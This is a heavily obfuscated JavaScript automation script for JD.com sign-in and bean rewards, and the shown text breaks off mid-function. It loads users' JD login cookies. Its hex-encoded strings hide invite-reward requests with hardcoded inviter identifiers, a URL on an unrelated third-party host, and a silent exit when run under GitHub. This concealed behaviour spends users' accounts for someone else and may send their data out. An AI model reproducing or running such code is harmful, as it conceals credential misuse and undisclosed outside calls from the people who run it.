/*
京东金榜 蚊子肉
author：freesoul
channel:https://t.me/proenv
日签到概率中1豆, 签满5天可集勋章抽奖 概率中3豆,中大的得看运气
 */
const $ = new Env('京东金榜');
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
const notify = $.isNode() ? require('./sendNotify') : '';


var __encode = 'jsjiami.com', _a = {},
    _0xb483 = ["\x5F\x64\x65\x63\x6F\x64\x65", "\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];
(function (_0xd642x1) {
    _0xd642x1[_0xb483[0]] = _0xb483[1]
})(_a);
var __Oxeaea0 = ["", "\x73\x63\x65\x6E\x65\x69\x64", "\x6A\x64\x67\x6F\x6C\x64\x65\x6E\x72\x61\x6E\x6B\x69\x6E\x67\x32\x30\x32\x32\x68\x35", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F\x63\x6C\x69\x65\x6E\x74\x2E\x61\x63\x74\x69\x6F\x6E", "\x6D\x65\x64\x61\x6C\x4E\x75\x6D", "\x69\x73\x4E\x6F\x64\x65", "\x70\x75\x73\x68", "\x66\x6F\x72\x45\x61\x63\x68", "\x6B\x65\x79\x73", "\x4A\x44\x5F\x44\x45\x42\x55\x47", "\x65\x6E\x76", "\x66\x61\x6C\x73\x65", "\x6C\x6F\x67", "\x47\x49\x54\x48\x55\x42", "\x69\x6E\x64\x65\x78\x4F\x66", "\x73\x74\x72\x69\x6E\x67\x69\x66\x79", "\x65\x78\x69\x74", "\x66\x69\x6C\x74\x65\x72", "\x43\x6F\x6F\x6B\x69\x65\x4A\x44", "\x67\x65\x74\x64\x61\x74\x61", "\x43\x6F\x6F\x6B\x69\x65\x4A\x44\x32", "\x63\x6F\x6F\x6B\x69\x65", "\x6D\x61\x70", "\x43\x6F\x6F\x6B\x69\x65\x73\x4A\x44", "\x5B\x5D", "\x74\x6F\x4F\x62\x6A", "\x64\x6F\x6E\x65", "\x66\x69\x6E\x61\x6C\x6C\x79", "\u274C\x20", "\x6E\x61\x6D\x65", "\x2C\x20\u5931\u8D25\x21\x20\u539F\u56E0\x3A\x20", "\x21", "\x63\x61\x74\x63\x68", "\u3010\u63D0\u793A\u3011\u8BF7\u5148\u83B7\u53D6\u4EAC\u4E1C\u8D26\u53F7\u4E00\x63\x6F\x6F\x6B\x69\x65\x0A\u76F4\u63A5\u4F7F\u7528\x4E\x6F\x62\x79\x44\x61\u7684\u4EAC\u4E1C\u7B7E\u5230\u83B7\u53D6", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x62\x65\x61\x6E\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F", "\x6D\x73\x67", "\x6C\x65\x6E\x67\x74\x68", "\x55\x73\x65\x72\x4E\x61\x6D\x65", "\x6D\x61\x74\x63\x68", "\x69\x6E\x64\x65\x78", "\x69\x73\x4C\x6F\x67\x69\x6E", "\x62\x65\x61\x6E\x73", "\x6E\x69\x63\x6B\x4E\x61\x6D\x65", "\x55\x55\x49\x44", "\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x2D\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78", "\x2A\x2A\x2A\x2A\x2A\x2A\u5F00\u59CB\u3010\u4EAC\u4E1C\u8D26\u53F7", "\u3011", "\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A", "\x77\x61\x69\x74", "\x72\x61\x6E\x64\x6F\x6D", "\x67\x6F\x6C\x64\x43\x65\x6E\x74\x65\x72\x48\x65\x61\x64", "\x7B\x7D", "\x70\x61\x72\x73\x65", "\x63\x6F\x64\x65", "\x30", "\x74\x61\x73\x6B\x44\x6F\x6E\x65", "\x72\x65\x73\x75\x6C\x74", "\u4ECA\u65E5\u5DF2\u7B7E\u5230\x2C\x20\u660E\u5929\u518D\u6765\uFF01", "\u5F53\u524D\u52CB\u7AE0\u6570\x3A", "\x62\x69\x6E\x67\x6F\x44\x6F\x6E\x65", "\u4ECA\u5929\u5DF2\u62BD\u8FC7\u4E00\u6B21\u5956\u52B1\uFF0C\u4E0D\u53EF\u91CD\u590D\u62BD\u5956\uFF01", "\u96C6\u9F50\u52CB\u7AE0\u6570\u91CF\u5DF2\u591F\x35\uFF0C\u5F00\u59CB\u62BD\u5956\uFF01", "\u96C6\u9F50\u52CB\u7AE0\u6570\u91CF\u4E0D\u591F\x35\uFF0C\u8FD8\u4E0D\u591F\u62BD\u5956\uFF01", "\x6C\x6F\x67\x45\x72\x72", "\x70\x6F\x73\x74", "\x51\x65\x49\x65\x78\x6B\x61\x46\x43\x35\x75\x4F\x54\x58\x65\x31\x48\x36\x38\x6B\x47\x77\x3D\x3D", "\x6E\x6F\x77", "\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D", "\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E\x2C\x20\x74\x65\x78\x74\x2F\x70\x6C\x61\x69\x6E\x2C\x20\x2A\x2F\x2A", "\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x6E\x76\x69\x74\x65\x2D\x72\x65\x77\x61\x72\x64\x2E\x6A\x64\x2E\x63\x6F\x6D", "\x7A\x68\x2D\x63\x6E", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x6E\x76\x69\x74\x65\x2D\x72\x65\x77\x61\x72\x64\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F", "\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D\x49\x6E\x76\x69\x74\x65\x46\x72\x69\x65\x6E\x64\x41\x70\x69\x53\x65\x72\x76\x69\x63\x65\x26\x62\x6F\x64\x79\x3D\x7B\x22\x6D\x65\x74\x68\x6F\x64\x22\x3A\x22\x61\x74\x74\x65\x6E\x64\x49\x6E\x76\x69\x74\x65\x41\x63\x74\x69\x76\x69\x74\x79\x22\x2C\x22\x64\x61\x74\x61\x22\x3A\x7B\x22\x69\x6E\x76\x69\x74\x65\x72\x50\x69\x6E\x22\x3A\x22", "\x22\x2C\x22\x63\x68\x61\x6E\x6E\x65\x6C\x22\x3A\x31\x2C\x22\x74\x6F\x6B\x65\x6E\x22\x3A\x22\x22\x2C\x22\x66\x72\x6F\x6E\x74\x65\x6E\x64\x49\x6E\x69\x74\x53\x74\x61\x74\x75\x73\x22\x3A\x22\x22\x7D\x7D\x26\x72\x65\x66\x65\x72\x65\x72\x3D\x2D\x31\x26\x65\x69\x64\x3D\x65\x69\x64\x49\x66\x33\x64\x64\x38\x31\x32\x31\x62\x37\x73\x64\x6D\x69\x42\x4C\x47\x64\x78\x52\x52\x34\x36\x4F\x6C\x57\x79\x68\x36\x32\x6B\x46\x41\x5A\x6F\x67\x54\x4A\x46\x6E\x59\x71\x71\x52\x6B\x77\x67\x72\x36\x33\x25\x32\x42\x64\x47\x6D\x4D\x6C\x63\x76\x37\x45\x51\x4A\x35\x76\x30\x48\x42\x69\x63\x38\x31\x78\x48\x58\x7A\x58\x4C\x77\x4B\x4D\x36\x66\x68\x33\x69\x39\x36\x33\x7A\x49\x61\x37\x59\x6D\x32\x76\x35\x65\x68\x6E\x77\x6F\x32\x42\x37\x75\x44\x4E\x39\x32\x51\x30\x26\x61\x69\x64\x3D\x26\x63\x6C\x69\x65\x6E\x74\x3D\x69\x6F\x73\x26\x63\x6C\x69\x65\x6E\x74\x56\x65\x72\x73\x69\x6F\x6E\x3D\x31\x34\x2E\x34\x26\x6E\x65\x74\x77\x6F\x72\x6B\x54\x79\x70\x65\x3D\x77\x69\x66\x69\x26\x66\x70\x3D\x2D\x31\x26\x61\x70\x70\x69\x64\x3D\x6D\x61\x72\x6B\x65\x74\x2D\x74\x61\x73\x6B\x2D\x68\x35\x26\x5F\x74\x3D", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F\x3F\x74\x3D", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x73\x73\x69\x67\x6E\x6D\x65\x6E\x74\x2E\x6A\x64\x2E\x63\x6F\x6D", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x73\x73\x69\x67\x6E\x6D\x65\x6E\x74\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F\x3F\x69\x6E\x76\x69\x74\x65\x72\x49\x64\x3D", "\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D\x54\x61\x73\x6B\x49\x6E\x76\x69\x74\x65\x53\x65\x72\x76\x69\x63\x65\x26\x62\x6F\x64\x79\x3D\x7B\x22\x6D\x65\x74\x68\x6F\x64\x22\x3A\x22\x70\x61\x72\x74\x69\x63\x69\x70\x61\x74\x65\x49\x6E\x76\x69\x74\x65\x54\x61\x73\x6B\x22\x2C\x22\x64\x61\x74\x61\x22\x3A\x7B\x22\x63\x68\x61\x6E\x6E\x65\x6C\x22\x3A\x22\x31\x22\x2C\x22\x65\x6E\x63\x72\x79\x70\x74\x69\x6F\x6E\x49\x6E\x76\x69\x74\x65\x72\x50\x69\x6E\x22\x3A\x22", "\x22\x2C\x22\x74\x79\x70\x65\x22\x3A\x31\x7D\x7D\x26\x61\x70\x70\x69\x64\x3D\x6D\x61\x72\x6B\x65\x74\x2D\x74\x61\x73\x6B\x2D\x68\x35\x26\x75\x75\x69\x64\x3D\x26\x5F\x74\x3D", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F", "\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D\x49\x6E\x76\x69\x74\x65\x46\x72\x69\x65\x6E\x64\x43\x68\x61\x6E\x67\x65\x41\x73\x73\x65\x72\x74\x73\x53\x65\x72\x76\x69\x63\x65\x26\x62\x6F\x64\x79\x3D", "\x61\x74\x74\x65\x6E\x64\x49\x6E\x76\x69\x74\x65\x41\x63\x74\x69\x76\x69\x74\x79", "\x26\x72\x65\x66\x65\x72\x65\x72\x3D\x2D\x31\x26\x65\x69\x64\x3D\x65\x69\x64\x49\x39\x62\x32\x39\x38\x31\x32\x30\x32\x66\x73\x65\x63\x38\x33\x69\x52\x57\x31\x6E\x54\x73\x4F\x56\x7A\x43\x6F\x63\x57\x64\x61\x33\x59\x48\x50\x4E\x34\x37\x31\x41\x59\x37\x38\x25\x32\x46\x51\x42\x68\x59\x62\x58\x65\x57\x74\x64\x67\x25\x32\x46\x33\x54\x43\x74\x56\x54\x4D\x72\x45\x31\x4A\x6A\x4D\x38\x53\x71\x74\x38\x66\x32\x54\x71\x46\x31\x5A\x35\x50\x25\x32\x46\x52\x50\x47\x6C\x7A\x41\x31\x64\x45\x52\x50\x30\x5A\x35\x62\x4C\x57\x64\x71\x35\x4E\x35\x42\x32\x56\x62\x42\x4F\x26\x61\x69\x64\x3D\x26\x63\x6C\x69\x65\x6E\x74\x3D\x69\x6F\x73\x26\x63\x6C\x69\x65\x6E\x74\x56\x65\x72\x73\x69\x6F\x6E\x3D\x31\x34\x2E\x34\x2E\x32\x26\x6E\x65\x74\x77\x6F\x72\x6B\x54\x79\x70\x65\x3D\x77\x69\x66\x69\x26\x66\x70\x3D\x2D\x31\x26\x75\x75\x69\x64\x3D\x61\x62\x30\x34\x38\x30\x38\x34\x62\x34\x37\x64\x66\x32\x34\x38\x38\x30\x36\x31\x33\x33\x32\x36\x66\x65\x66\x66\x64\x66\x37\x65\x65\x65\x34\x37\x31\x34\x38\x38\x26\x6F\x73\x56\x65\x72\x73\x69\x6F\x6E\x3D\x31\x34\x2E\x34\x2E\x32\x26\x64\x5F\x62\x72\x61\x6E\x64\x3D\x69\x50\x68\x6F\x6E\x65\x26\x64\x5F\x6D\x6F\x64\x65\x6C\x3D\x69\x50\x68\x6F\x6E\x65\x31\x30\x2C\x32\x26\x61\x67\x65\x6E\x74\x3D\x2D\x31\x26\x70\x61\x67\x65\x43\x6C\x69\x63\x6B\x4B\x65\x79\x3D\x2D\x31\x26\x70\x6C\x61\x74\x66\x6F\x72\x6D\x3D\x33\x26\x6C\x61\x6E\x67\x3D\x7A\x68\x5F\x43\x4E\x26\x61\x70\x70\x69\x64\x3D\x6D\x61\x72\x6B\x65\x74\x2D\x74\x61\x73\x6B\x2D\x68\x35\x26\x5F\x74\x3D", "\x7A\x68\x2D\x43\x4E\x2C\x7A\x68\x2D\x48\x61\x6E\x73\x3B\x71\x3D\x30\x2E\x39", "\x67\x7A\x69\x70\x2C\x20\x64\x65\x66\x6C\x61\x74\x65\x2C\x20\x62\x72", "\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D\x54\x61\x73\x6B\x49\x6E\x76\x69\x74\x65\x53\x65\x72\x76\x69\x63\x65\x26\x62\x6F\x64\x79\x3D", "\x70\x61\x72\x74\x69\x63\x69\x70\x61\x74\x65\x49\x6E\x76\x69\x74\x65\x54\x61\x73\x6B", "\x31", "\x26\x61\x70\x70\x69\x64\x3D\x6D\x61\x72\x6B\x65\x74\x2D\x74\x61\x73\x6B\x2D\x68\x35\x26\x75\x75\x69\x64\x3D\x26\x5F\x74\x3D", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x73\x73\x69\x67\x6E\x6D\x65\x6E\x74\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F", "\x6C\x6F\x67\x53\x74\x72", "\x67\x6F\x6C\x64\x43\x65\x6E\x74\x65\x72\x44\x6F\x54\x61\x73\x6B", "\x67\x6F\x6C\x64\x43\x65\x6E\x74\x65\x72\x44\x6F\x54\x61\x73\x6B\x20\x41\x50\x49\u8BF7\u6C42\u5931\u8D25\uFF0C\u8BF7\u68C0\u67E5\u7F51\u8DEF\u91CD\u8BD5", "\x74\x61\x73\x6B\x43\x6F\x64\x65", "\u7B7E\u5230\u7ED3\u679C\x3A\x20", "\x6C\x6F\x74\x74\x65\x72\x79\x53\x63\x6F\x72\x65", "\u5931\u8D25\uFF1A", "\x74\x61\x73\x6B\x4D\x73\x67", "\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D", "\x26\x62\x6F\x64\x79\x3D", "\x26\x61\x70\x70\x69\x64\x3D\x63\x6F\x6E\x74\x65\x6E\x74\x5F\x65\x63\x6F\x6C\x6F\x67\x79\x26\x63\x6C\x69\x65\x6E\x74\x56\x65\x72\x73\x69\x6F\x6E\x3D\x31\x31\x2E\x31\x2E\x32\x26\x63\x6C\x69\x65\x6E\x74\x3D\x77\x68\x35\x26\x75\x75\x69\x64\x3D", "\x26\x65\x78\x74\x3D", "\x26\x61\x72\x65\x61\x3D", "\x2A\x2F\x2A", "\x6B\x65\x65\x70\x2D\x61\x6C\x69\x76\x65", "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x35\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F\x62\x61\x62\x65\x6C\x44\x69\x79\x2F\x5A\x65\x75\x73\x2F\x33\x32\x78\x52\x6F\x58\x57\x6D\x65\x70\x62\x42\x56\x48\x66\x44\x4D\x6F\x48\x4D\x77\x32\x6B\x47\x66\x48\x64\x46\x2F\x69\x6E\x64\x65\x78\x2E\x68\x74\x6D\x6C", "\x68\x74\x74\x70\x3A\x2F\x2F\x68\x7A\x2E\x66\x65\x76\x65\x72\x72\x75\x6E\x2E\x74\x6F\x70\x3A\x39\x39\x2F\x73\x68\x61\x72\x65\x2F\x67\x65\x74\x2F\x6B\x6F\x69\x6C\x6F\x67\x73\x3F\x66\x6C\x61\x67\x3D\x67\x6F\x6C\x64", "\x6A\x64\x61\x70\x70\x3B\x61\x6E\x64\x72\x6F\x69\x64\x3B\x31\x31\x2E\x31\x2E\x32\x3B\x6A\x64\x53\x75\x70\x70\x6F\x72\x74\x44\x61\x72\x6B\x4D\x6F\x64\x65\x2F\x30\x3B\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x4C\x69\x6E\x75\x78\x3B\x20\x41\x6E\x64\x72\x6F\x69\x64\x20\x31\x30\x3B\x20\x50\x43\x43\x4D\x30\x30\x20\x42\x75\x69\x6C\x64\x2F\x51\x4B\x51\x31\x2E\x31\x39\x31\x30\x32\x31\x2E\x30\x30\x32\x3B\x20\x77\x76\x29\x20\x41\x70\x70\x6C\x65\x57\x65\x62\x4B\x69\x74\x2F\x35\x33\x37\x2E\x33\x36\x20\x28\x4B\x48\x54\x4D\x4C\x2C\x20\x6C\x69\x6B\x65\x20\x47\x65\x63\x6B\x6F\x29\x20\x56\x65\x72\x73\x69\x6F\x6E\x2F\x34\x2E\x30\x20\x43\x68\x72\x6F\x6D\x65\x2F\x38\x39\x2E\x30\x2E\x34\x33\x38\x39\x2E\x37\x32\x20\x4D\x51\x51\x42\x72\x6F\x77\x73\x65\x72\x2F\x36\x2E\x32\x20\x54\x42\x53\x2F\x30\x34\x36\x30\x31\x31\x20\x4D\x6F\x62\x69\x6C\x65\x20\x53\x61\x66\x61\x72\x69\x2F\x35\x33\x37\x2E\x33\x36", "\u8BF7\u6C42\u5931\u8D25\uFF0C\u8BF7\u68C0\u67E5\u7F51\u8DEF", "\x64\x61\x74\x61", "\x67\x65\x74", "\x6F\x62\x6A\x65\x63\x74", "\u4EAC\u4E1C\u670D\u52A1\u5668\u8BBF\u95EE\u6570\u636E\u4E3A\u7A7A\uFF0C\u8BF7\u68C0\u67E5\u81EA\u8EAB\u8BBE\u5907\u7F51\u7EDC\u60C5\u51B5", "\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78\x78", "\x78", "\x74\x6F\x55\x70\x70\x65\x72\x43\x61\x73\x65", "\x72\x65\x70\x6C\x61\x63\x65", "\x2E", "\x5F", "\x55\x41", "\x6A\x64\x61\x70\x70\x3B\x69\x50\x68\x6F\x6E\x65\x3B\x31\x30\x2E\x35\x2E\x32\x3B", "\x3B", "\x3B\x6E\x65\x74\x77\x6F\x72\x6B\x2F\x77\x69\x66\x69\x3B\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x69\x50\x68\x6F\x6E\x65\x3B\x20\x43\x50\x55\x20\x69\x50\x68\x6F\x6E\x65\x20\x4F\x53\x20", "\x20\x6C\x69\x6B\x65\x20\x4D\x61\x63\x20\x4F\x53\x20\x58\x29\x20\x41\x70\x70\x6C\x65\x57\x65\x62\x4B\x69\x74\x2F\x36\x30\x35\x2E\x31\x2E\x31\x35\x20\x28\x4B\x48\x54\x4D\x4C\x2C\x20\x6C\x69\x6B\x65\x20\x47\x65\x63\x6B\x6F\x29\x3B\x73\x75\x70\x70\x6F\x72\x74\x4A\x44\x53\x48\x57\x4B\x2F\x31", "\x6A\x64\x6C\x74\x61\x70\x70\x3B\x61\x6E\x64\x72\x6F\x69\x64\x3B\x33\x2E\x38\x2E\x31\x30\x3B\x31\x30\x3B\x6E\x65\x74\x77\x6F\x72\x6B\x2F\x77\x69\x66\x69\x3B\x6D\x6F\x64\x65\x6C\x2F\x4D\x49\x20\x38\x3B\x61\x64\x64\x72\x65\x73\x73\x69\x64\x2F\x31\x39\x36\x39\x39\x39\x38\x30\x35\x39\x3B\x61\x69\x64\x2F\x38\x35\x36\x36\x39\x37\x32\x64\x66\x64\x39\x61\x37\x39\x35\x64\x3B\x6F\x61\x69\x64\x2F\x34\x61\x38\x62\x37\x37\x33\x63\x33\x65\x33\x30\x37\x33\x38\x36\x3B\x6F\x73\x56\x65\x72\x2F\x32\x39\x3B\x61\x70\x70\x42\x75\x69\x6C\x64\x2F\x31\x34\x33\x36\x3B\x70\x73\x6E\x2F\x50\x68\x59\x62\x55\x74\x43\x73\x43\x4A\x6F\x20\x72\x20\x31\x62\x38\x68\x77\x78\x6A\x6E\x59\x38\x72\x45\x76\x35\x53\x38\x58\x43\x7C\x33\x38\x33\x3B\x70\x73\x71\x2F\x31\x34\x3B\x61\x64\x6B\x2F\x3B\x61\x64\x73\x2F\x3B\x70\x61\x70\x2F\x4A\x41\x32\x30\x32\x30\x5F\x33\x31\x31\x32\x35\x33\x31\x7C\x33\x2E\x38\x2E\x31\x30\x7C\x41\x4E\x44\x52\x4F\x49\x44\x20\x31\x30\x3B\x6F\x73\x76\x2F\x31\x30\x3B\x70\x76\x2F\x33\x37\x34\x2E\x31\x34\x3B\x6A\x64\x76\x2F\x30\x7C\x69\x6F\x73\x61\x70\x70\x7C\x74\x5F\x33\x33\x35\x31\x33\x39\x37\x37\x34\x7C\x6C\x69\x74\x65\x73\x68\x61\x72\x65\x7C\x43\x6F\x70\x79\x55\x52\x4C\x7C\x31\x36\x30\x39\x33\x30\x36\x35\x39\x30\x31\x37\x35\x7C\x31\x36\x30\x39\x33\x30\x36\x35\x39\x36\x3B\x72\x65\x66\x2F\x63\x6F\x6D\x2E\x6A\x64\x2E\x6A\x64\x6C\x69\x74\x65\x2E\x6C\x69\x62\x2E\x6A\x64\x6C\x69\x74\x65\x6D\x65\x73\x73\x61\x67\x65\x2E\x76\x69\x65\x77\x2E\x61\x63\x74\x69\x76\x69\x74\x79\x2E\x4D\x65\x73\x73\x61\x67\x65\x43\x65\x6E\x74\x65\x72\x4D\x61\x69\x6E\x41\x63\x74\x69\x76\x69\x74\x79\x3B\x70\x61\x72\x74\x6E\x65\x72\x2F\x6A\x73\x78\x64\x6C\x79\x71\x6A\x30\x39\x3B\x61\x70\x70\x72\x70\x64\x2F\x4D\x65\x73\x73\x61\x67\x65\x43\x65\x6E\x74\x65\x72\x5F\x4D\x65\x73\x73\x61\x67\x65\x4D\x65\x72\x67\x65\x3B\x65\x75\x66\x76\x2F\x31\x3B\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x4C\x69\x6E\x75\x78\x3B\x20\x41\x6E\x64\x72\x6F\x69\x64\x20\x31\x30\x3B\x20\x4D\x49\x20\x38\x20\x42\x75\x69\x6C\x64\x2F\x51\x4B\x51\x31\x2E\x31\x39\x30\x38\x32\x38\x2E\x30\x30\x32\x3B\x20\x77\x76\x29\x20\x41\x70\x70\x6C\x65\x57\x65\x62\x4B\x69\x74\x2F\x35\x33\x37\x2E\x33\x36\x20\x28\x4B\x48\x54\x4D\x4C\x2C\x20\x6C\x69\x6B\x65\x20\x47\x65\x63\x6B\x6F\x29\x20\x56\x65\x72\x73\x69\x6F\x6E\x2F\x34\x2E\x30\x20\x43\x68\x72\x6F\x6D\x65\x2F\x36\x36\x2E\x30\x2E\x33\x33\x35\x39\x2E\x31\x32\x36\x20\x4D\x51\x51\x42\x72\x6F\x77\x73\x65\x72\x2F\x36\x2E\x32\x20\x54\x42\x53\x2F\x30\x34\x35\x31\x34\x30\x20\x4D\x6F\x62\x69\x6C\x65\x20\x53\x61\x66\x61\x72\x69\x2F\x35\x33\x37\x2E\x33\x36", "\x66\x6C\x6F\x6F\x72", "\x31\x32\x2E\x30", "\x31\x32\x2E\x31", "\x31\x32\x2E\x32", "\x31\x32\x2E\x33", "\x31\x32\x2E\x34", "\x31\x32\x2E\x35", "\x31\x33\x2E\x30", "\x31\x33\x2E\x31", "\x31\x33\x2E\x32", "\x31\x33\x2E\x33", "\x31\x33\x2E\x34", "\x31\x33\x2E\x35", "\x31\x33\x2E\x36", "\x31\x33\x2E\x37", "\x31\x34\x2E\x30", "\x31\x34\x2E\x31", "\x31\x34\x2E\x32", "\x31\x34\x2E\x33", "\x31\x34\x2E\x34", "\x31\x34\x2E\x35", "\x31\x34\x2E\x36", "\x31\x34\x2E\x37", "\x31\x34\x2E\x38", "\x31\x35\x2E\x30", "\x31\x35\x2E\x31", "\x31\x35\x2E\x32", "\x31\x35\x2E\x33", "\x75\x6E\x64\x65\x66\x69\x6E\x65\x64", "\u5220\u9664", "\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A", "\u671F\u5F39\u7A97\uFF0C", "\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C", "\x6A\x73\x6A\x69\x61", "\x6D\x69\x2E\x63\x6F\x6D"];
let cookiesArr = [], cookie = __Oxeaea0[0x0], message;
$[__Oxeaea0[0x1]] = __Oxeaea0[0x2];
const JD_API_HOST = __Oxeaea0[0x3];
$[__Oxeaea0[0x4]] = 0;
if ($[__Oxeaea0[0x5]]()) {
    Object[__Oxeaea0[0x8]](jdCookieNode)[__Oxeaea0[0x7]]((_0xc7bax5) => {
        cookiesArr[__Oxeaea0[0x6]](jdCookieNode[_0xc7bax5])
    });
    if (process[__Oxeaea0[0xa]][__Oxeaea0[0x9]] && process[__Oxeaea0[0xa]][__Oxeaea0[0x9]] === __Oxeaea0[0xb]) {
        console[__Oxeaea0[0xc]] = () => {
        }
    }
    ;
    if (JSON[__Oxeaea0[0xf]](process[__Oxeaea0[0xa]])[__Oxeaea0[0xe]](__Oxeaea0[0xd]) > -1) {
        process[__Oxeaea0[0x10]](0)
    }
} else {
    cookiesArr = [$[__Oxeaea0[0x13]](__Oxeaea0[0x12]), $[__Oxeaea0[0x13]](__Oxeaea0[0x14]), ...$[__Oxeaea0[0x19]]($[__Oxeaea0[0x13]](__Oxeaea0[0x17]) || __Oxeaea0[0x18])[__Oxeaea0[0x16]]((_0xc7bax5) => {
        return _0xc7bax5[__Oxeaea0[0x15]]
    })][__Oxeaea0[0x11]]((_0xc7bax5) => {
        return !!_0xc7bax5
    })
}
;!(async () => {
    if (!cookiesArr[0x0]) {
        $[__Oxeaea0[0x23]]($[__Oxeaea0[0x1d]], __Oxeaea0[0x21], __Oxeaea0[0x22], {"\x6F\x70\x65\x6E\x2D\x75\x72\x6C": __Oxeaea0[0x22]});
        return
    }
    ;
    for (let _0xc7bax7 = 0; _0xc7bax7 < cookiesArr[__Oxeaea0[0x24]]; _0xc7bax7++) {
        if (cookiesArr[_0xc7bax7]) {
            UA = getJDUA();
            cookie = cookiesArr[_0xc7bax7];
            $[__Oxeaea0[0x25]] = decodeURIComponent(cookie[__Oxeaea0[0x26]](/pt_pin=(.+?);/) && cookie[__Oxeaea0[0x26]](/pt_pin=(.+?);/)[0x1]);
            $[__Oxeaea0[0x27]] = _0xc7bax7 + 1;
            $[__Oxeaea0[0x28]] = true;
            $[__Oxeaea0[0x29]] = 0;
            $[__Oxeaea0[0x2a]] = __Oxeaea0[0x0];
            message = __Oxeaea0[0x0];
            $[__Oxeaea0[0x2b]] = getUUID(__Oxeaea0[0x2c]);
            console[__Oxeaea0[0xc]](`${__Oxeaea0[0x2d]}${$[__Oxeaea0[0x27]]}${__Oxeaea0[0x2e]}${$[__Oxeaea0[0x2a]] || $[__Oxeaea0[0x25]]}${__Oxeaea0[0x2f]}`);
            await doInfo();
            await $[__Oxeaea0[0x30]](100);
            await goldCenterHead();
            await $[__Oxeaea0[0x30]](parseInt(Math[__Oxeaea0[0x31]]() * 5500 + 3500, 10))
        }
    }
})()[__Oxeaea0[0x20]]((_0xc7bax6) => {
    $[__Oxeaea0[0xc]](__Oxeaea0[0x0], `${__Oxeaea0[0x1c]}${$[__Oxeaea0[0x1d]]}${__Oxeaea0[0x1e]}${_0xc7bax6}${__Oxeaea0[0x1f]}`, __Oxeaea0[0x0])
})[__Oxeaea0[0x1b]](() => {
    $[__Oxeaea0[0x1a]]()
});

function goldCenterHead() {
    return new Promise((_0xc7bax9) => {
        const _0xc7baxa = taskUrl(__Oxeaea0[0x32], __Oxeaea0[0x33]);
        $[__Oxeaea0[0x40]](_0xc7baxa, async (_0xc7baxb, _0xc7baxc, _0xc7baxd) => {
            try {
                if (_0xc7baxb) {
                } else {
                    if (safeGet(_0xc7baxd)) {
                        _0xc7baxd = JSON[__Oxeaea0[0x34]](_0xc7baxd);
                        if (_0xc7baxd[__Oxeaea0[0x35]] === __Oxeaea0[0x36]) {
                            if (_0xc7baxd[__Oxeaea0[0x38]][__Oxeaea0[0x37]] == 1) {
                                console[__Oxeaea0[0xc]](`${__Oxeaea0[0x39]}`);
                                $[__Oxeaea0[0x4]] = _0xc7baxd[__Oxeaea0[0x38]][__Oxeaea0[0x4]]
                            } else {
                                await goldCreatorDoTask(1);
                                $[__Oxeaea0[0x4]] = _0xc7baxd[__Oxeaea0[0x38]][__Oxeaea0[0x4]] && _0xc7baxd[__Oxeaea0[0x38]][__Oxeaea0[0x4]] + 1
                            }
                            ;await $[__Oxeaea0[0x30]](1000);
                            console[__Oxeaea0[0xc]](`${__Oxeaea0[0x3a]}${$[__Oxeaea0[0x4]]}${__Oxeaea0[0x0]}`);
                            if (_0xc7baxd[__Oxeaea0[0x38]][__Oxeaea0[0x3b]] == 1) {
                                console[__Oxeaea0[0xc]](__Oxeaea0[0x3c])
                            } else {
                                if ($[__Oxeaea0[0x4]] == 5) {
                                    console[__Oxeaea0[0xc]](`${__Oxeaea0[0x3d]}`);
                                    await goldCreatorDoTask(2)
                                } else {
                                    console[__Oxeaea0[0xc]](__Oxeaea0[0x3e])
                                }
                            }
                            ;await $[__Oxeaea0[0x30]](1000)
